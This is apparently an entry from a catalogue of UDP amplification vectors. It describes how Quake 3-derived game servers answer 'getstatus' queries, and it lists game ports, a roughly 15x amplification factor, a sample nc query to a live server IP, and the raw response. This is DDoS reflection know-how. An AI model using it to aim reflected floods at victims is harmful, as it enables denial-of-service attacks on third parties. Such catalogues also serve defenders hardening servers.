# Quake3 Netcode (In General)

## Observed Games and Ports:

* Soldier of Fortune 2 - **20100**
* Nexuiz - **26000**
* Quake 3, Wolfenstein, Star Trek Elite Force, Urban Terror - **27960**
* Star Wars JK2 - **28070**
* Call of Duty (1, 2, 3, 4, MW2, UO) - **28960**
* Star Wars JK - **29070**
* Star Trek Elite Force 2 - **29253**
* FiveM - **30120**
* Tremulous - **30720**

## Proto: UDP

## Amplification factor: ~15x

## Reflector count: Various

---

Ancient netcode that has been reused in multiple titles (Even Fallout 76 has taken some of it).

Amplification via this method has dated back to early 2000s, such as the use of Call of Duty amplification in the program "DevNull" ran by Steam user "Stan".

* All servers running this code respond to "getinfo" and "getstatus" commands.
* Some may have ratelimits (such as FiveM)

### Example Requests / Responses

#### Call of Duty 4 GetStatus request

* Request: 13 bytes

  * ASCII: `getstatus`

    ```bash
    echo -ne '\xff\xff\xff\xffgetstatus'|nc -u 157.230.246.0 28960 -w2
    ```

* Response: Avg 500 bytes (differs on type of game)

  * ASCII character space:
  
    `statusResponse
    \type\-1\pswrd\1\fs_game\mods/pml220\sv_maxclients\24\version\CoD4 X 1.8 linux-i386 build 2055 May  2 2017\shortversion\1.8\build\2055\sv_hostname\^1TEAM ^5pulseCORE ^3SERVER\sv_minPing\0\sv_maxPing\0\sv_voice\0\sv_maxRate\25000\sv_floodprotect\4\_CoD4 X Site\http://cod4x.me\protocol\17\sv_privateClients\0\sv_disableClientConsole\0\g_mapStartTime\Sat Oct  3 22:34:15 2020\uptime\285 days\g_gametype\sd\mapname\mp_strike\sv_pure\1\gamename\Call of Duty 4\g_compassShowEnemies\0`

  * Raw bytes:

    `ffffffff737461747573526573706f6e73650a5c747970655c2d315c70737772645c315c66735f67616d655c6d6f64732f706d6c3232305c73765f6d6178636c69656e74735c32345c76657273696f6e5c436f4434205820312e38206c696e75782d69333836206275696c642032303535204d617920203220323031375c73686f727476657273696f6e5c312e385c6275696c645c323035355c73765f686f73746e616d655c5e315445414d205e3570756c7365434f5245205e335345525645525c73765f6d696e50696e675c305c73765f6d617850696e675c305c73765f766f6963655c305c73765f6d6178526174655c32353030305c73765f666c6f6f6470726f746563745c345c5f436f4434205820536974655c687474703a2f2f636f6434782e6d655c70726f746f636f6c5c31375c73765f70726976617465436c69656e74735c305c73765f64697361626c65436c69656e74436f6e736f6c655c305c675f6d6170537461727454696d655c536174204f63742020332032323a33343a313520323032305c757074696d655c32383520646179735c675f67616d65747970655c73645c6d61706e616d655c6d705f737472696b655c73765f707572655c315c67616d656e616d655c43616c6c206f66204475747920345c675f636f6d7061737353686f77456e656d6965735c300a`
